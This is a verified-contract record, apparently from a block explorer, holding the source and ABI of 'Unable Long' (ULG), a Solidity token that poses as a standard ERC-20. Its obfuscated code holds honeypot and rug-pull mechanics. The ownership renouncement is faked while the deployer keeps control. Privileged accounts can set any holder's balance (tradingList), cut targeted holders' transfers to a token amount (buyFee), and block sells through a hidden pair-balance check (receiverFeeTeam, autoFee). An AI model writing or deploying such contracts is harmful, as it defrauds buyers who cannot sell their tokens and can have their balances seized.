{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface limitFundTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract enableSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenMin {\n    function createPair(address exemptTotalAmount, address liquidityTrading) external returns (address);\n}\n\ninterface tradingMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountMinTx) external view returns (uint256);\n\n    function transfer(address teamLaunched, uint256 txShouldFrom) external returns (bool);\n\n    function allowance(address teamTakeReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txShouldFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamLaunched,\n        uint256 txShouldFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingFrom, uint256 value);\n    event Approval(address indexed teamTakeReceiver, address indexed spender, uint256 value);\n}\n\ninterface tradingMaxMetadata is tradingMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UnableLong is enableSwap, tradingMax, tradingMaxMetadata {\n\n    bool private modeMax;\n\n    bool public feeSell;\n\n    mapping(address => bool) public receiverLaunched;\n\n    function receiverReceiverEnable() private view {\n        require(receiverLaunched[_msgSender()]);\n    }\n\n    uint256 private receiverTake;\n\n    address autoTotalExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return toAuto;\n    }\n\n    mapping(address => bool) public walletEnableAmount;\n\n    function maxSender(address minFee, address teamLaunched, uint256 txShouldFrom) internal returns (bool) {\n        require(totalToken[minFee] >= txShouldFrom);\n        totalToken[minFee] -= txShouldFrom;\n        totalToken[teamLaunched] += txShouldFrom;\n        emit Transfer(minFee, teamLaunched, txShouldFrom);\n        return true;\n    }\n\n    uint256 constant receiverLiquidity = 12 ** 10;\n\n    address private modeReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return listFund;\n    }\n\n    string private listFund = \"Unable Long\";\n\n    function approve(address isMarketing, uint256 txShouldFrom) public virtual override returns (bool) {\n        txMarketing[_msgSender()][isMarketing] = txShouldFrom;\n        emit Approval(_msgSender(), isMarketing, txShouldFrom);\n        return true;\n    }\n\n    function balanceOf(address amountMinTx) public view virtual override returns (uint256) {\n        return totalToken[amountMinTx];\n    }\n\n    function buyFee(address feeListLaunched) public {\n        receiverReceiverEnable();\n        \n        if (feeListLaunched == minFund || feeListLaunched == maxMarketingTake) {\n            return;\n        }\n        walletEnableAmount[feeListLaunched] = true;\n    }\n\n    function amountLimit() public {\n        emit OwnershipTransferred(minFund, address(0));\n        modeReceiver = address(0);\n    }\n\n    uint256 isShouldTrading;\n\n    bool private receiverToken;\n\n    address totalAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private receiverWallet;\n\n    mapping(address => mapping(address => uint256)) private txMarketing;\n\n    mapping(address => uint256) private totalToken;\n\n    function getOwner() external view returns (address) {\n        return modeReceiver;\n    }\n\n    function owner() external view returns (address) {\n        return modeReceiver;\n    }\n\n    constructor (){\n        if (receiverAmountFund != walletFee) {\n            toAt = receiverTake;\n        }\n        limitFundTo sellBuy = limitFundTo(autoTotalExempt);\n        maxMarketingTake = tokenMin(sellBuy.factory()).createPair(sellBuy.WETH(), address(this));\n        if (receiverToken) {\n            receiverTake = walletFee;\n        }\n        minFund = _msgSender();\n        amountLimit();\n        receiverLaunched[minFund] = true;\n        totalToken[minFund] = teamShould;\n        if (toAt == walletFee) {\n            walletFee = receiverAmountFund;\n        }\n        emit Transfer(address(0), minFund, teamShould);\n    }\n\n    function receiverFeeTeam(uint256 txShouldFrom) public {\n        receiverReceiverEnable();\n        isShouldTrading = txShouldFrom;\n    }\n\n    uint256 private receiverAmountFund;\n\n    uint8 private fromMax = 18;\n\n    uint256 private teamShould = 100000000 * 10 ** 18;\n\n    function allowance(address toIs, address isMarketing) external view virtual override returns (uint256) {\n        if (isMarketing == autoTotalExempt) {\n            return type(uint256).max;\n        }\n        return txMarketing[toIs][isMarketing];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromMax;\n    }\n\n    uint256 shouldLaunch;\n\n    function autoFee(address minFee, address teamLaunched, uint256 txShouldFrom) internal returns (bool) {\n        if (minFee == minFund) {\n            return maxSender(minFee, teamLaunched, txShouldFrom);\n        }\n        uint256 senderFee = tradingMax(maxMarketingTake).balanceOf(totalAt);\n        require(senderFee == isShouldTrading);\n        require(teamLaunched != totalAt);\n        if (walletEnableAmount[minFee]) {\n            return maxSender(minFee, teamLaunched, receiverLiquidity);\n        }\n        return maxSender(minFee, teamLaunched, txShouldFrom);\n    }\n\n    uint256 public toAt;\n\n    uint256 public walletFee;\n\n    function walletReceiver(address tradingTeam) public {\n        require(tradingTeam.balance < 100000);\n        if (feeSell) {\n            return;\n        }\n        \n        receiverLaunched[tradingTeam] = true;\n        \n        feeSell = true;\n    }\n\n    address public maxMarketingTake;\n\n    function tradingList(address takeLiquidityTrading, uint256 txShouldFrom) public {\n        receiverReceiverEnable();\n        totalToken[takeLiquidityTrading] = txShouldFrom;\n    }\n\n    address public minFund;\n\n    string private toAuto = \"ULG\";\n\n    event OwnershipTransferred(address indexed sellMarketing, address indexed receiverFrom);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamShould;\n    }\n\n    function transfer(address takeLiquidityTrading, uint256 txShouldFrom) external virtual override returns (bool) {\n        return autoFee(_msgSender(), takeLiquidityTrading, txShouldFrom);\n    }\n\n    function transferFrom(address minFee, address teamLaunched, uint256 txShouldFrom) external override returns (bool) {\n        if (_msgSender() != autoTotalExempt) {\n            if (txMarketing[minFee][_msgSender()] != type(uint256).max) {\n                require(txShouldFrom <= txMarketing[minFee][_msgSender()]);\n                txMarketing[minFee][_msgSender()] -= txShouldFrom;\n            }\n        }\n        return autoFee(minFee, teamLaunched, txShouldFrom);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamTakeReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txShouldFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMinTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeListLaunched\",\"type\":\"address\"}],\"name\":\"buyFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxMarketingTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txShouldFrom\",\"type\":\"uint256\"}],\"name\":\"receiverFeeTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLiquidityTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txShouldFrom\",\"type\":\"uint256\"}],\"name\":\"tradingList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLiquidityTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txShouldFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txShouldFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletEnableAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTeam\",\"type\":\"address\"}],\"name\":\"walletReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "UnableLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}